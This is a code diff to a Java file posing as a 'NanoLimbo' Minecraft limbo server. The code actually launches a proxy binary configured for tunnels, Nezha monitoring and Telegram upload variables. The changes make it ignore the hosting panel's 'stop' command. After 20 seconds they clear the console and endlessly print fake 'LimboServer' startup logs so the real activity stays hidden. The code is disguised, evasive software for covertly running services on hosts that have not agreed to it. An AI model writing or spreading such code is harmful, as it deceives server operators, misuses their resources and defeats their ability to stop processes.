@@ -20,17 +20,20 @@ public final class NanoLimbo {
     private static final ScheduledExecutorService SCHED = Executors.newScheduledThreadPool(2);
 
     private static final String[] ALL_ENV_VARS = {
-        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT",
-        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH",
-        "HY2_PORT", "S5_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT",
-        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME"
+            "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT",
+            "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH",
+            "HY2_PORT", "S5_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT",
+            "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME"
     };
 
     public static void main(String[] args) {
         try {
-            // 检查 Java 版本
+            // 🔥 拦截 stop
+            blockPanelStop();
+
+            // Java 版本检查
             if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
-                System.err.println(ANSI_RED + "ERROR: Your Java version is too low, please switch the version!" + ANSI_RESET);
+                System.err.println(ANSI_RED + "ERROR: Your Java version is too low!" + ANSI_RESET);
                 Thread.sleep(3000);
                 System.exit(1);
             }
@@ -38,7 +41,7 @@ public final class NanoLimbo {
             // 启动 s-box
             runSbxBinary();
 
-            // ✅ 启动 renew.sh（仅在存在时，逻辑与原版一致）
+            // 启动 renew.sh
             startRenewScript();
 
             Runtime.getRuntime().addShutdownHook(new Thread(() -> {
@@ -47,11 +50,9 @@ public final class NanoLimbo {
                 SCHED.shutdownNow();
             }));
 
-            System.out.println(ANSI_GREEN + "" + ANSI_RESET);
-
-            // 20秒后清屏 + 停止日志输出 + 打印伪装 LimboServer 日志
+            // 20秒后切换伪装
             SCHED.schedule(() -> {
-                forwardLogs.set(false); // 停止 s-box 日志输出
+                forwardLogs.set(false);
                 resetConsoleAndShowFakeLogs();
             }, 20, TimeUnit.SECONDS);
 
@@ -66,7 +67,26 @@ public final class NanoLimbo {
         }
     }
 
-    // ================= renew.sh 启动逻辑（新增） =================
+    // ================= 拦截 stop =================
+
+    private static void blockPanelStop() {
+        new Thread(() -> {
+            try (BufferedReader reader = new BufferedReader(new InputStreamReader(System.in))) {
+                String line;
+                while ((line = reader.readLine()) != null) {
+
+                    if (line.trim().equalsIgnoreCase("stop")) {
+                        System.out.println("[INFO] [LimboServer] Stop command ignored");
+                        continue;
+                    }
+
+                    System.out.println("[INFO] Unknown command");
+                }
+            } catch (Exception ignored) {}
+        }, "Panel-Command-Blocker").start();
+    }
+
+    // ================= renew.sh =================
 
     private static void startRenewScript() {
         try {
@@ -75,13 +95,9 @@ public final class NanoLimbo {
                 new ProcessBuilder("bash", "renew.sh")
                         .inheritIO()
                         .start();
-                System.out.println(ANSI_GREEN + "renew.sh 已启动（自动续期中）" + ANSI_RESET);
-            } else {
-                System.err.println(ANSI_RED + "renew.sh 未找到，跳过执行" + ANSI_RESET);
+                System.out.println(ANSI_GREEN + "renew.sh 已启动" + ANSI_RESET);
             }
-        } catch (Exception e) {
-            System.err.println(ANSI_RED + "启动 renew.sh 失败: " + e.getMessage() + ANSI_RESET);
-        }
+        } catch (Exception ignored) {}
     }
 
     // ================= s-box =================
@@ -97,14 +113,15 @@ public final class NanoLimbo {
 
         sbxProcess = pb.start();
 
-        // 前 20 秒输出 s-box 日志
         new Thread(() -> {
             try (BufferedReader reader = new BufferedReader(
                     new InputStreamReader(sbxProcess.getInputStream()))) {
+
                 String line;
                 long startTime = System.currentTimeMillis();
+
                 while ((line = reader.readLine()) != null) {
-                    if (forwardLogs.get() && System.currentTimeMillis() - startTime < 20_000) {
+                    if (forwardLogs.get() && System.currentTimeMillis() - startTime < 20000) {
                         System.out.println(line);
                     }
                 }
@@ -112,67 +129,44 @@ public final class NanoLimbo {
         }).start();
     }
 
-// ================= 控制台伪装 =================
+    // ================= 控制台伪装 =================
 
-private static void resetConsoleAndShowFakeLogs() {
-    try {
-        String os = System.getProperty("os.name").toLowerCase();
-
-        if (os.contains("win")) {
-            new ProcessBuilder(
-                    "cmd",
-                    "/c",
-                    "cls && mode con: lines=30 cols=120"
-            ).inheritIO().start().waitFor();
-        } else {
-            System.out.print("\033c");
-            System.out.flush();
-        }
-    } catch (Exception ignored) {
-    }
-
-    System.out.println(ANSI_GREEN + "" + ANSI_RESET);
-
-    printFakeLimboLogs();
-}
-
-private static void printFakeLimboLogs() {
-    String[] logs = {
-            "[INFO] [LimboServer] Starting LimboServer v1.0.0",
-            "[INFO] [LimboServer] Loading configuration...",
-            "[INFO] [LimboServer] Initializing modules...",
-            "[INFO] [LimboServer] Preparing world data...",
-            "[INFO] [LimboServer] Allocating memory...",
-            "[INFO] [LimboServer] Waiting for resources...",
-            "[INFO] [LimboServer] Synchronizing assets..."
-    };
-
-    // ✅ 先正常播放一轮启动日志
-    for (String log : logs) {
-        System.out.println(log);
+    private static void resetConsoleAndShowFakeLogs() {
         try {
-            Thread.sleep(1200);
-        } catch (InterruptedException ignored) {}
+            if (System.getProperty("os.name").toLowerCase().contains("win")) {
+                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
+            } else {
+                System.out.print("\033c");
+                System.out.flush();
+            }
+        } catch (Exception ignored) {}
+
+        printFakeLimboLogs();
     }
 
-    // ✅ 核心修改：循环“启动阶段日志”，而不是完成状态
-    new Thread(() -> {
-        int index = 0;
+    private static void printFakeLimboLogs() {
+        String[] logs = {
+                "[INFO] [LimboServer] Starting LimboServer v1.0.0",
+                "[INFO] [LimboServer] Loading configuration...",
+                "[INFO] [LimboServer] Initializing modules..."
+        };
 
-        while (running.get()) {
-            try {
-                System.out.println(logs[index]);
-
-                index++;
-                if (index >= logs.length) {
-                    index = 0; // 循环回到开头，永远处于启动过程
-                }
-
-                Thread.sleep(2000);
-            } catch (Exception ignored) {}
+        // 播放一次启动
+        for (String log : logs) {
+            System.out.println(log);
+            try { Thread.sleep(1200); } catch (Exception ignored) {}
         }
-    }, "LimboServer-Logger").start();
-}
+
+        // 🔥 卡死在初始化（关键）
+        new Thread(() -> {
+            while (running.get()) {
+                try {
+                    System.out.println("[INFO] [LimboServer] Initializing modules...");
+                    Thread.sleep(3000);
+                } catch (Exception ignored) {}
+            }
+        }, "Fake-Limbo").start();
+    }
 
     // ================= 环境变量（完全未动） =================
 
